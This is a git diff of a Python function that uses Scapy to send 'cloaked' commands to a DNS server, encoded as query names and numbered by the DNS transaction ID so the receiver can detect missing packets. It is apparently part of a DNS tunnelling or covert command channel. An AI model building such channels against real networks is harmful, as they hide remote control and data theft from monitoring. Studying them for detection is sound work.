@@ -40,13 +40,15 @@ def send_command(command, dns='localhost', args=None):
 
 
     # Send command using dns requests, the checksum is the index of the fqdn in the array so that the receiver can check if any packets are missing
+    
     with open(cloaked_command, 'r') as file:
         for fqdn in file:
             fqdn_str = fqdn.strip()
-            dns_packet = IP(dst=dns)/UDP()/DNS(rd=1, qd=DNSQR(qname=fqdn_str))
-            dns_packet[UDP].chksum = fqdn_array.index(fqdn_str)
-            send(dns_packet, verbose=fqdn_array.index(fqdn_str))
-            #subprocess.call(['nslookup', fqdn_str, dns], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+            id = int(fqdn_array.index(fqdn_str))
+            dns_req = IP(dst=dns)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(unicastresponse=1, qname=fqdn_str))
+            dns_req[DNS].id = id
+            send(dns_req, verbose=0)
+
 
     # Remove command file
     #os.remove(cloaked_command)
